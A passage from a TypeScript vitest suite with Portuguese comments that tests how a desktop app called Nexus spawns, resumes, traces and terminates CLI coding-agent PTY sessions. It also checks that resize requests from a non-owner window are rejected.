    ['prime-agent', 'PRIME_AGENT_SESSION_DIR', '.prime/agent', 'sessions/chat.jsonl'],
  ])('materializes %s state per checkout before decoration and preserves native conversations', async (kind, envKey, profile, conversation) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'f567-tui-spawn-'));
    const nativeHome = path.join(root, 'native');
    const profileDir = path.join(nativeHome, profile);
    const nativeConversation = path.join(profileDir, conversation);
    fs.mkdirSync(path.dirname(nativeConversation), { recursive: true });
    fs.writeFileSync(nativeConversation, 'native conversation');
    fs.writeFileSync(path.join(profileDir, 'auth.json'), '{"fixture":true}');
    vi.stubEnv('HOME', nativeHome);
    vi.stubEnv('USERPROFILE', nativeHome);
    const host = fakeHost();
    setPtyHost(host.host);
    const prepared: Record<string, string>[] = [];
    setAgentSpawnHook((_adapter, _req, _authority, env) => {
      prepared.push({ ...env });
      return { authorityToken: 'f567-tui-spawn', env: { [envKey]: profileDir }, extraArgs: [] };
    });
    const sessions: string[] = [];
    const stateRoots: string[] = [];
    try {
      for (const suffix of ['a', 'b']) {
        const base = trustedSpawn();
        const authority = { ...base, scope: { ...base.scope, checkoutId: `${path.basename(root)}-${suffix}` } };
        const stateRoot = path.join(app.getPath('userData'), 'provider-state', kind, authority.scope.checkoutId);
        stateRoots.push(stateRoot);
        const adapter = { ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }), id: kind };
        const spawned = spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 }, adapter, {}, authority);
        sessions.push(spawned.sessionId);
        const env = host.specFor(spawned.sessionId).env;
        expect(env[envKey]).toBe(prepared.at(-1)![envKey]);
        expect(env[envKey]).toContain(stateRoot + path.sep);
        expect(fs.statSync(env[envKey]!).isDirectory()).toBe(true);
        const targetProfile = kind === 'droid' ? path.join(env.HOME!, '.factory') : env[envKey]!;
        const targetConversation = path.join(targetProfile, kind === 'prime-agent' ? 'chat.jsonl' : conversation);
        expect(fs.existsSync(targetConversation)).toBe(false);
        fs.mkdirSync(path.dirname(targetConversation), { recursive: true });
        fs.writeFileSync(targetConversation, `checkout ${suffix}`);
        if (kind !== 'prime-agent') {
          expect(fs.readFileSync(path.join(targetProfile, 'auth.json'), 'utf8')).toBe('{"fixture":true}');
          expect(fs.statSync(path.join(targetProfile, 'auth.json')).ino).toBe(fs.statSync(path.join(profileDir, 'auth.json')).ino);
        }
        expect(fs.readFileSync(nativeConversation, 'utf8')).toBe('native conversation');
        await orchTerminateSession(spawned.sessionId);
        expect(fs.readFileSync(targetConversation, 'utf8')).toBe(`checkout ${suffix}`);
      }
      expect(stateRoots[0]).not.toBe(stateRoots[1]);
    } finally {
      for (const id of sessions) await orchTerminateSession(id);
      setAgentSpawnHook(null);
      vi.unstubAllEnvs();
      fs.rmSync(root, { recursive: true, force: true });
      for (const dir of stateRoots) fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it.each(['claude', 'codex', 'grok', 'opencode'])('does not route %s through the TUI state hook', async (kind) => {
    const host = fakeHost();
    setPtyHost(host.host);
    setAgentSpawnHook(null);
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    const base = trustedSpawn();
    const authority = { ...base, scope: { ...base.scope, checkoutId: `tui-unaffected-${kind}` } };
    const before = agentEnv(builtinCliPtyAdapter(kind), null);
    const spawned = spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 }, builtinCliPtyAdapter(kind), {}, authority);
    try {
      const env = host.specFor(spawned.sessionId).env;
      for (const key of ['HOME', 'USERPROFILE', 'CODEX_HOME', 'GROK_HOME', 'XDG_DATA_HOME']) {
        expect(env[key]).toBe(before[key]);
      }
      expect(fs.existsSync(path.join(app.getPath('userData'), 'provider-state', kind, authority.scope.checkoutId))).toBe(false);
    } finally {
      await orchTerminateSession(spawned.sessionId);
    }
  });

  it('disables latest resume in every builtin while retaining exact resume templates', () => {
    for (const raw of BUILTIN_ADAPTERS) {
      if ((raw as { kind: string }).kind !== 'cli-pty') continue;
      const adapter = cliPtyAdapterSchema.parse(raw);
      expect(adapter.spawn.resumeArgs, adapter.id).toEqual([]);
      if (adapter.id !== 'aider') expect(adapter.spawn.resumeIdArgs?.length, adapter.id).toBeGreaterThan(0);
    }
  });

  it.each(['agy', 'devin'] as const)('keeps %s checkout state after MCP and managed-home overrides for direct and mission spawns', async (kind) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'f567-provider-spawn-'));
    const envKey = kind === 'agy' ? 'GEMINI_CLI_HOME' : 'XDG_DATA_HOME';
    const sourceHome = path.join(root, 'account');
    fs.mkdirSync(sourceHome);
    if (kind === 'agy') {
      const cache = path.join(sourceHome, 'antigravity-cli', 'cache');
      fs.mkdirSync(cache, { recursive: true });
      fs.writeFileSync(path.join(cache, 'onboarding.json'), JSON.stringify({
        onboardingComplete: true, consumerOnboardingComplete: true, enterpriseOnboardingComplete: false,
      }));
    }
    const h = fakeHost();
    setPtyHost(h.host);
    setSquadCliPolicyLookupForTests(() => 'operator-choice');
    setAgentSpawnHook(() => ({ authorityToken: "f567-test", env: { [envKey]: path.join(root, 'legacy'), HOME: root }, extraArgs: [] }));
    const sessions: string[] = [];
    try {
      const homes: string[] = [];
      for (const authority of [trustedSpawn(), revisionBoundWorker()]) {
        const spawned = spawnAgentSession(
          fakeWc(),
          { kind: 'cli-agent', paneId: `f567-${kind}-${authority.source}`, cols: 80, rows: 24 },
          builtinCliPtyAdapter(kind),
          { keyEnv: { [envKey]: sourceHome } }, authority,
        );
        sessions.push(spawned.sessionId);
        const spec = h.specFor(spawned.sessionId);
        expect(spec.env[envKey]).toContain(path.join(app.getPath('userData'), 'provider-state', kind, authority.scope.checkoutId));
        expect(spec.env[envKey]).not.toBe(sourceHome);
        if (kind === 'agy') expect(spec.env[envKey]).toBe(path.join(spec.env.HOME!, '.gemini'));
        homes.push(spec.env[envKey]!);
      }
      expect(homes[0]).toBe(homes[1]);
    } finally {
      for (const id of sessions) await orchTerminateSession(id);
      setAgentSpawnHook(null);
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("F-721: o id de retomada que nunca virou transcrito não prende o Maestro", () => {
  const STALE = "b3df56cb-0000-4000-8000-0000000000aa";
  const claudeLikeSpawn = { resumeArgs: [], resumeIdArgs: ["--resume"], sessionIdArg: "--session-id" };

  function resumeHost() {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, next) {
        handlers = next;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({ ok: true, rootExited: true, descendantsExited: true })),
        };
      },
    });
    return () => handlers!;
  }
  function spawnResumed(send: ReturnType<typeof vi.fn>, paneId = "pane-7f20afda") {
    return spawnAgentSession(
      { isDestroyed: () => false, isCrashed: () => false, send } as unknown as WebContents,
      { kind: "cli-agent", paneId, resume: true, resumeLatestOnly: false, cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }, claudeLikeSpawn),
      {},
      persistedMissionGrant(),
    );
  }
  const exited = (send: ReturnType<typeof vi.fn>, count: number) =>
    send.mock.calls.filter(([channel]) => channel === PTY_CHANNELS.exit).length >= count;

  it("depois do SEGUNDO boot rápido com erro do mesmo id — em panes DIFERENTES (cada Retomar abre um pane novo) —, o vínculo é esquecido; o primeiro só avisa", async () => {
    const handlersOf = resumeHost();
    const forget = vi.fn(() => 2);
    setResumeSessionLookup(() => STALE);
    setResumeSessionForget(forget);
    try {
      const send = vi.fn();
      spawnResumed(send);
      handlersOf().onExit(1);
      await vi.waitFor(() => expect(exited(send, 1)).toBe(true));
      expect(forget).not.toHaveBeenCalled();

      spawnResumed(send, "pane-novo-do-retomar");
      handlersOf().onExit(1);
      await vi.waitFor(() => expect(exited(send, 2)).toBe(true));
      expect(forget).toHaveBeenCalledTimes(1);
      expect(forget).toHaveBeenCalledWith(
        expect.objectContaining({ installationId: expect.any(String), projectId: expect.any(String), checkoutId: expect.any(String) }),
        "test-cli",
        STALE,
      );
    } finally {
      setResumeSessionLookup(null);
      setResumeSessionForget(null);
    }
  });

  it("falha de ambiente (código ≠ 1) e encerramento pedido pelo Nexus não contam como golpe contra o id", async () => {
    const handlersOf = resumeHost();
    const forget = vi.fn(() => 1);
    setResumeSessionLookup(() => STALE);
    setResumeSessionForget(forget);
    try {
      const send = vi.fn();
      for (let round = 1; round <= 3; round += 1) {
        spawnResumed(send, `pane-env-${round}`);
        handlersOf().onExit(127);
        await vi.waitFor(() => expect(exited(send, round)).toBe(true));
      }
      expect(forget).not.toHaveBeenCalled();
    } finally {
      setResumeSessionLookup(null);
      setResumeSessionForget(null);
    }
  });

  it("o pty:exit leva a origem quando foi o próprio Nexus que encerrou, e nada quando o processo saiu sozinho", async () => {
    const exitPayloads = (send: ReturnType<typeof vi.fn>, sessionId: string) =>
      send.mock.calls
        .filter(([channel, payload]) => channel === PTY_CHANNELS.exit && payload?.sessionId === sessionId)
        .map(([, payload]) => payload as Record<string, unknown>);

    const sendKilled = vi.fn();
    setPtyHost(fakeHost().host);
    const killed = spawnAgentSession(
      { isDestroyed: () => false, isCrashed: () => false, send: sendKilled } as unknown as WebContents,
      { kind: "cli-agent", paneId: "pane-killed", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      missionGrantFor("mission-trace"),
    );
    await orchTerminateSession(killed.sessionId, { origin: "fast-lane:respawn-stale-orchestrator" });
    expect(exitPayloads(sendKilled, killed.sessionId)).toEqual([
      expect.objectContaining({ terminationOrigin: "fast-lane:respawn-stale-orchestrator" }),
    ]);

    const sendNatural = vi.fn();
    const handlersOf = resumeHost();
    const natural = spawnAgentSession(
      { isDestroyed: () => false, isCrashed: () => false, send: sendNatural } as unknown as WebContents,
      { kind: "cli-agent", paneId: "pane-natural-2", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      missionGrantFor("mission-trace"),
    );
    handlersOf().onExit(1);
    await vi.waitFor(() => {
      expect(exitPayloads(sendNatural, natural.sessionId)).toHaveLength(1);
    });
    expect(exitPayloads(sendNatural, natural.sessionId)[0]).not.toHaveProperty("terminationOrigin");
  });
});

describe("F-1237: autoria por proveniência — o pane retomado responde pelas edições registradas da própria conversa", () => {
  it("edição registrada pelo hook na 1ª encarnação bloqueia o Stop da retomada exata; WIP alheio posterior ao nascimento segue herdado; outro pane não herda o registro", async () => {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "f1237-prov-")));
    const sh = new ProcessGitRunner();
    const put = (file: string, content: string) => {
      fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
      fs.writeFileSync(path.join(root, file), content);
    };
    const tick = () => new Promise((resolve) => setTimeout(resolve, 30));
    sh.run(root, ["init", "-q"]);
    put("package.json", JSON.stringify({ devDependencies: { vitest: "^3.0.0" } }));
    put("node_modules/.bin/vitest", "#!/bin/sh\n");
    put(".gitignore", "node_modules\n");
    sh.run(root, ["add", "-A"]);
    sh.run(root, ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "base"]);
    const authority = trustedSpawn(root);
    // Claude-like: o Main dita o id da conversa no spawn fresco e o retoma depois.
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false },
      { resumeArgs: [], resumeIdArgs: ["--resume"], sessionIdArg: "--session-id" });
    const map = {
      mapHash: "m", inventory: { entrypoints: [] }, symbols: { hubs: [] },
      graph: { edgeCount: 2, dbEdgeCount: 0, sampleEdges: [], dbEntities: [],
        adjacency: { "src/x.test.ts": ["src/x.ts"], "src/seal.test.ts": ["src/seal.ts"] },
        reverse: { "src/x.ts": ["src/x.test.ts"], "src/seal.ts": ["src/seal.test.ts"] } },
    } as unknown as ProjectOrientationMap;
    const blastRadius = ({ changedFiles }: { changedFiles: readonly string[] }) => ({
      tests: [...computeBlastRadius(map, { seedFiles: changedFiles, depth: 1 }).tests], dbEntities: [], dbConsumers: [],
    });
    // Vermelho no checkout do pane; verde na worktree da base (F-246): a quebra é do diff.
    const exec = vi.fn<RegressionExec>(async (_file, args, options) => {
      const outFile = args.find((arg) => arg.startsWith("--outputFile="))!.slice("--outputFile=".length);
      const files = args.filter((arg) => arg.endsWith(".test.ts"));
      const red = options.cwd === root;
      fs.writeFileSync(outFile, JSON.stringify({ testResults: files.map((file) => ({
        name: path.join(options.cwd, file), status: red ? "failed" : "passed",
        assertionResults: [red
          ? { status: "failed", fullName: "x", failureMessages: ["vermelho"] }
          : { status: "passed", fullName: "ok" }],
      })) }));
      return { exitCode: red ? 1 : 0, timedOut: false, stdout: "", stderr: "" };
    });
    const results: RegressionGateResult[] = [];
    // Stop do pane do operador com o spawn e o registro que o Main resolve (sem injeção).
    const stop = (sessionId: string) => handleHookRegressionRequest({ role: "user", sessionId, scope: authority.scope }, {}, {
      run: async (input) => {
        const result = await runRegressionGate(input, { exec, extensions: { blastRadius } });
        results.push(result);
        return result;
      },
      enabled: () => true,
    });
    setPtyHost(fakeHost().host);
    __resetRegressionGateForTests();
    __resetHookRegressionForTests();
    __resetHookEditProvenanceForTests();
    try {
      // 1ª encarnação: a conversa nasce aqui e escreve x.ts + o teste dele.
      const first = spawnAgentSession(fakeWc(), { kind: "cli-agent", paneId: "pane-f1237", cols: 80, rows: 24 }, adapter, {}, authority);
      const conversation = getSessionProviderConversation(first.sessionId)!;
      expect(conversation).toMatchObject({ adapterId: "test-cli", paneId: "pane-f1237", resumed: false });
      const conversationId = conversation.conversationId!;
      expect(conversationId).toMatch(/^[0-9a-f-]{36}$/);
      const firstCtx = { sessionId: first.sessionId, scope: authority.scope };
      for (const file of ["src/x.ts", "src/x.test.ts"]) {
        put(file, file.endsWith(".test.ts") ? "import { x } from './x';\n" : "export const x = 1;\n");
        // PostToolUse do Write, pelo bearer do próprio pane.
        expect(await recordHookEditProvenance(firstCtx, "tool-complete", {
          session_id: conversationId, cwd: root, tool_name: "Write", tool_input: { file_path: path.join(root, file) },
        })).toBe(1);
      }
      // (c) Corpo com outra conversa, ou caminho fora da raiz: nada registrado.
      expect(await recordHookEditProvenance(firstCtx, "tool-complete", {
        session_id: "conversa-do-outro-agente", tool_name: "Edit", tool_input: { file_path: path.join(root, "src/seal.ts") },
      })).toBe(0);
      expect(await recordHookEditProvenance(firstCtx, "tool-complete", {
        session_id: conversationId, tool_name: "Edit", tool_input: { file_path: path.join(os.tmpdir(), "fora-da-raiz.ts") },
      })).toBe(0);
      orchKillSession(first.sessionId);
      await tick();

      // Outro agente no mesmo checkout: WIP vermelho DEPOIS do nascimento da conversa.
      put("src/seal.ts", "export const seal = 1;\n");
      put("src/seal.test.ts", "import { seal } from './seal';\n");
      await tick();

      // Retomada exata após reinício: sessão e spawn novos, a mesma conversa.
      setResumeSessionLookup((_scope, paneId) => (paneId === "pane-f1237" ? conversationId : null));
      const resumed = spawnAgentSession(fakeWc(), { kind: "cli-agent", paneId: "pane-f1237", resume: true, cols: 80, rows: 24 }, adapter, {}, authority);
      expect(resumed.resumeMode).toBe("exact");
      expect(getSessionProviderConversation(resumed.sessionId)).toMatchObject({ conversationId, resumed: true });
      const blocked = await stop(resumed.sessionId);
      expect(blocked.payload.decision).toBe("block");
      expect(results.at(-1)!.failures.map((failure) => failure.file)).toEqual(["src/x.test.ts"]);
      expect(results.at(-1)!.inheritedFailures.map((failure) => failure.file)).toEqual(["src/seal.test.ts"]);
      orchKillSession(resumed.sessionId);

      // Pane novo no mesmo checkout: o registro é da conversa, não do checkout.
      __resetRegressionGateForTests();
      const fresh = spawnAgentSession(fakeWc(), { kind: "cli-agent", paneId: "pane-f1237-novo", cols: 80, rows: 24 }, adapter, {}, authority);
      const inherited = await stop(fresh.sessionId);
      expect(inherited.payload.decision).toBeUndefined();
      expect(results.at(-1)!.failures).toEqual([]);
      expect(String(inherited.payload.systemMessage)).toContain("WIP anterior ao seu spawn");
      orchKillSession(fresh.sessionId);
    } finally {
      setResumeSessionLookup(null);
      __resetRegressionGateForTests();
      __resetHookRegressionForTests();
      __resetHookEditProvenanceForTests();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("F-212 PTY lifecycle tracing (exit + termination origin)", () => {
  beforeEach(() => {
    lifecycleTrace.events.length = 0;
  });

  const lifecycleEvents = (kind: string, sessionId: string) =>
    lifecycleTrace.events.filter(
      (event) => event.kind === kind && event.sessionId === sessionId,
    );

  function tracedAgentSession(
    host: PtyHost,
    paneId = "pane-trace",
  ): { sessionId: string } {
    setPtyHost(host);
    return spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", paneId, cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      missionGrantFor("mission-trace"),
    );
  }

  it("exit após terminate rotulado persiste origem, exitCode e signal", async () => {
    const h = fakeHost();
    const { sessionId } = tracedAgentSession(h.host);
    await orchTerminateSession(sessionId, {
      origin: "fast-lane:respawn-stale-orchestrator",
    });
    expect(lifecycleEvents("agent-pty-terminate", sessionId)).toEqual([
      expect.objectContaining({
        sessionId,
        origin: "fast-lane:respawn-stale-orchestrator",
      }),
    ]);
    expect(lifecycleEvents("agent-pty-exit", sessionId)).toEqual([
      expect.objectContaining({
        sessionId,
        paneId: "pane-trace",
        missionId: "mission-trace",
        role: "orchestrator",
        adapterId: "test-cli",
        exitCode: 0,
        signal: 15,
        uptimeMs: expect.any(Number),
        terminationOrigin: "fast-lane:respawn-stale-orchestrator",
      }),
    ]);
  });

  it("F-1354: terminate rotulado registra callerSessionId e papel de quem pediu", async () => {
    const h = fakeHost();
    const { sessionId } = tracedAgentSession(h.host);
    await orchTerminateSession(sessionId, {
      origin: "pane-close",
      callerSessionId: "session-operator-1234",
      role: "orchestrator",
    } as any);
    expect(lifecycleEvents("agent-pty-terminate", sessionId)).toEqual([
      expect.objectContaining({
        sessionId,
        origin: "pane-close",
        callerSessionId: "session-operator-1234",
        role: "orchestrator",
      }),
    ]);
  });

  it("exit natural (sem pedido Nexus) registra terminationOrigin null e o signal", async () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, next) {
        handlers = next;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          // O exit real já chegou por onExit; este terminate é só o drive
          // interno de prova física (raiz + descendentes), não um pedido que
          // atribua origem à morte.
          terminate: vi.fn(async () => ({
            ok: true,
            rootExited: true,
            descendantsExited: true,
          })),
        };
      },
    });
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", paneId: "pane-natural", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      missionGrantFor("mission-trace"),
    );
    handlers!.onExit(1, 2);
    await vi.waitFor(() => {
      expect(lifecycleEvents("agent-pty-exit", sessionId)).toHaveLength(1);
    });
    expect(lifecycleEvents("agent-pty-exit", sessionId)[0]).toEqual(
      expect.objectContaining({
        sessionId,
        exitCode: 1,
        signal: 2,
        terminationOrigin: null,
      }),
    );
  });

  it("F-792: o tap de terminação recebe a saída da raiz que saiu sozinha; o encerramento pedido chega sem ela", async () => {
    const seen = new Map<string, unknown>();
    const dispose = tapSessionTermination((sessionId, _agent, rootExit) => {
      seen.set(sessionId, rootExit);
    });
    try {
      let handlers: PtySessionHandlers | null = null;
      setPtyHost({
        spawn(_spec, next) {
          handlers = next;
          return {
            write: vi.fn(),
            resize: vi.fn(),
            kill: vi.fn(),
            terminate: vi.fn(async () => ({
              ok: true,
              rootExited: true,
              descendantsExited: true,
            })),
          };
        },
      });
      const natural = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", paneId: "pane-f792-natural", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        missionGrantFor("mission-f792"),
      );
      handlers!.onExit(1, 0);
      expect(seen.get(natural.sessionId)).toEqual({ exitCode: 1, signal: 0 });
      await vi.waitFor(() => {
        expect(lifecycleEvents("agent-pty-exit", natural.sessionId)).toHaveLength(1);
      });

      const killed = tracedAgentSession(fakeHost().host, "pane-f792-killed");
      await orchTerminateSession(killed.sessionId, { origin: "pane-close" });
      expect(seen.has(killed.sessionId)).toBe(true);
      expect(seen.get(killed.sessionId)).toBeNull();
    } finally {
      dispose();
    }
  });

  it("onExit duplicado não duplica o evento de exit no trace", async () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, next) {
        handlers = next;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({
            ok: true,
            rootExited: true,
            descendantsExited: true,
          })),
        };
      },
    });
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", paneId: "pane-double", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      missionGrantFor("mission-trace"),
    );
    handlers!.onExit(0, 15);
    handlers!.onExit(0, 15);
    await vi.waitFor(() => {
      expect(lifecycleEvents("agent-pty-exit", sessionId)).toHaveLength(1);
    });
  });

  it("pane cli-agent direto do operador (role user, sem missão) também grava agent-pty-exit", async () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, next) {
        handlers = next;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({
            ok: true,
            rootExited: true,
            descendantsExited: true,
          })),
        };
      },
    });
    // Os Maestros de aba do operador mortos em 28/09 eram panes diretos
    // (autoridade direct-user, contexto null → role 'user'): a saída deles
    // precisa do mesmo trace que os panes de missão.
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", paneId: "pane-direct-user", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );
    handlers!.onExit(0, 15);
    await vi.waitFor(() => {
      expect(lifecycleEvents("agent-pty-exit", sessionId)).toHaveLength(1);
    });
    expect(lifecycleEvents("agent-pty-exit", sessionId)[0]).toEqual(
      expect.objectContaining({
        sessionId,
        paneId: "pane-direct-user",
        missionId: null,
        role: "user",
        adapterId: "test-cli",
        exitCode: 0,
        signal: 15,
        terminationOrigin: null,
      }),
    );
  });
});

describe("F-216 — evidência de drift e resize descartado", () => {
  beforeEach(() => {
    lifecycleTrace.events.length = 0;
  });

  const driftEvents = (sessionId: string) =>
    lifecycleTrace.events.filter(
      (event) => event.kind === "pty-grid-drift" && event.sessionId === sessionId,
    );
  const droppedEvents = (sessionId: string) =>
    lifecycleTrace.events.filter(
      (event) =>
        event.kind === "pty-resize-dropped" && event.sessionId === sessionId,
    );

  function ownedShell(cols = 80, rows = 24) {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols, rows },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    return { owner, sessionId, h };
  }

  it("assert resize emite pty-grid-drift só quando o tamanho do PTY diverge", () => {
    const { owner, sessionId, h } = ownedShell(80, 24);
    const proc = h.procFor(sessionId);

    // Mesma grade: asserção sem drift — nada no trace.
    resizeSession(owner, sessionId, 80, 24, { assert: true });
    expect(driftEvents(sessionId)).toEqual([]);

    // Grade diferente: drift registrado UMA vez e o resize ainda é aplicado.
    // F-248: `reported` distingue "renderer nunca mandou" de "Main perdeu".
    resizeSession(owner, sessionId, 120, 40, {
      assert: true,
      reported: { cols: 80, rows: 24 },
    });
    expect(driftEvents(sessionId)).toEqual([
      {
        kind: "pty-grid-drift",
        sessionId,
        ptyCols: 80,
        ptyRows: 24,
        cols: 120,
        rows: 40,
        reportedCols: 80,
        reportedRows: 24,
      },
    ]);
    expect(proc.resize).toHaveBeenCalledWith(120, 40);

    // Depois do reassert o PTY já está na grade pedida: novo assert, sem drift.
    resizeSession(owner, sessionId, 120, 40, { assert: true });
    expect(driftEvents(sessionId)).toHaveLength(1);
    orchKillSession(sessionId);
  });

  it("resize de quem não é dono emite pty-resize-dropped uma vez por sessão", () => {
    const { sessionId } = ownedShell(80, 24);
    const attacker = fakeWc();

    resizeSession(attacker, sessionId, 100, 30);
    resizeSession(attacker, sessionId, 100, 30);
    resizeSession(attacker, sessionId, 90, 30);
    expect(droppedEvents(sessionId)).toEqual([
      { kind: "pty-resize-dropped", sessionId },
    ]);

    // Sessão inexistente não gera evento (não é caso de posse).
    resizeSession(attacker, "sessao-inexistente", 100, 30);
    expect(
      lifecycleTrace.events.filter(
        (event) => event.kind === "pty-resize-dropped",
      ),
    ).toHaveLength(1);
    orchKillSession(sessionId);
  });

  it("assert em sessão alheia não vaza grade nem aplica resize", () => {
    const { sessionId, h } = ownedShell(80, 24);
    const attacker = fakeWc();
    resizeSession(attacker, sessionId, 100, 30, { assert: true });
    expect(driftEvents(sessionId)).toEqual([]);
    expect(h.procFor(sessionId).resize).not.toHaveBeenCalled();
    expect(droppedEvents(sessionId)).toHaveLength(1);
    orchKillSession(sessionId);
  });
});


it('license denial prevents both agent and shell host spawns even with NEXUS_PANE_GUARD=off', () => {
  const h = fakeHost(); setPtyHost(h.host);
  const spy = vi.spyOn(h.host, 'spawn');
  vi.stubEnv('NEXUS_PANE_GUARD', 'off');
  vi.mocked(requireAccess).mockReturnValue({ ok: false, reason: 'trial-ended' });
  try {
    expect(() => spawnAgentSession(fakeWc(), { kind: 'cli-agent', cols: 80, rows: 24 }, { id: 'test-cli' } as never, {}, trustedSpawn())).toThrow(/license_access_denied/);
    expect(() => spawnSession(fakeWc(), { cols: 80, rows: 24, kind: 'shell' }, { ...trustedSpawn(), shell: '/bin/zsh' })).toThrow(/license_access_denied/);
    expect(spy).not.toHaveBeenCalled();
  } finally { vi.unstubAllEnvs(); }
});

describe("F-788: Qwen numa worktree longa abre com cwd lógico curto", () => {
  function qwenFixture() {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "f788-qwen-")));
    const entry = path.join(root, "qwen-code", "cli-entry.js");
    const bin = path.join(root, "bin", "qwen");
    fs.mkdirSync(path.dirname(entry), { recursive: true });
    fs.writeFileSync(entry, "#!/usr/bin/env node\n");
    fs.mkdirSync(path.dirname(bin), { recursive: true });
    fs.symlinkSync(entry, bin);
    // Mesmo formato da worktree de writer: o nome do projeto passa de 255 com qualquer tmpdir
    // (o do macOS é comprido; o /tmp do Linux não).
    let lead = 64;
    let worktree = "";
    do {
      worktree = path.join(root, `project-${"a".repeat(lead)}`, `checkout-${"b".repeat(64)}`,
        "worktrees", `task-${"c".repeat(64)}`);
      lead += 8;
    } while (!qwenNeedsLogicalCwd(worktree));
    fs.mkdirSync(worktree, { recursive: true });
    return { root, entry, bin, worktree };
  }

  async function spawnQwen(bin: string, authority: BoundSpawnAuthority): Promise<PtySpawnSpec> {
    const host = fakeHost();
    setPtyHost(host.host);
    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24, model: "qwen3.8-max" },
      builtinCliPtyAdapter("qwen"),
      { binPath: bin },
      authority,
    );
    const spec = host.specFor(sessionId);
    await orchTerminateSession(sessionId);
    return spec;
  }

  it("worktree longa: Node + preload + entrypoint, apelido estável e o --session-id intacto; worktree curta não muda", async () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    setAgentSpawnHook(null);
    const fx = qwenFixture();
    try {
      const spec = await spawnQwen(fx.bin, revisionBoundWorker(fx.worktree));
      const stateHome = path.join(app.getPath("userData"), "provider-state", "qwen", "checkout-test");
      expect(spec.file).toBe("/mock/bin/node");
      expect(spec.args.slice(0, 3)).toEqual([
        "--require", path.join(stateHome, "nexus-logical-cwd.cjs"), fx.entry,
      ]);
      expect(spec.args.slice(3)).toEqual(expect.arrayContaining(["--model", "qwen3.8-max", "--session-id"]));
      // O processo continua na worktree física; o Qwen vê o apelido.
      expect(spec.cwd).toBe(fx.worktree);
      const alias = spec.env.NEXUS_QWEN_LOGICAL_CWD!;
      expect(path.dirname(alias)).toBe(stateHome);
      expect(fs.readlinkSync(alias)).toBe(fx.worktree);
      expect(spec.env.PWD).toBe(alias);
      expect(alias.replace(/[^a-zA-Z0-9]/g, "-").length).toBeLessThanOrEqual(255);
      // Respawn da mesma worktree: mesmo apelido (o --resume acha a conversa).
      const again = await spawnQwen(fx.bin, revisionBoundWorker(fx.worktree));
      expect(again.env.NEXUS_QWEN_LOGICAL_CWD).toBe(alias);

      const short = await spawnQwen(fx.bin, revisionBoundWorker(fx.root));
      expect(short.file).toBe(fx.bin);
      expect(short.args).not.toContain("--require");
      expect(short.env.NEXUS_QWEN_LOGICAL_CWD).toBeUndefined();
    } finally {
      fs.rmSync(fx.root, { recursive: true, force: true });
    }
  });
});

describe("F-789: MiniMax abre pelo Node que carrega o SQLite nativo do mcode", () => {
  function mcodeFixture() {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "f789-mcode-")));
    const pkg = path.join(root, "lib", "node_modules", "@minimax-ai", "code");
    const addonDir = path.join(pkg, "node_modules", "better-sqlite3", "build", "Release");
    fs.mkdirSync(addonDir, { recursive: true });
    fs.writeFileSync(path.join(pkg, "package.json"), JSON.stringify({ name: "@minimax-ai/code", bin: { mcode: "./cli.js" } }));
    const entry = path.join(pkg, "cli.js");
    fs.writeFileSync(entry, "#!/usr/bin/env node\n");
    fs.writeFileSync(path.join(addonDir, "better_sqlite3.node"), "abi-147");
    const bin = path.join(root, "bin", "mcode");
    fs.mkdirSync(path.dirname(bin));
    fs.symlinkSync(entry, bin);
    const nodes = ["node22", "node26"].map((version) => {
      const node = path.join(root, version, "bin", "node");
